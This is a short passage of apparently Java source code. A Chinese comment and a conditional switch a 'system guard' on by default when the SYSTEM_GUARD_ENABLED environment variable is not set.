        // 运行时检查环境变量，如果没有配置则默认开启守护
        if (!env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = true;
        }
    }
}
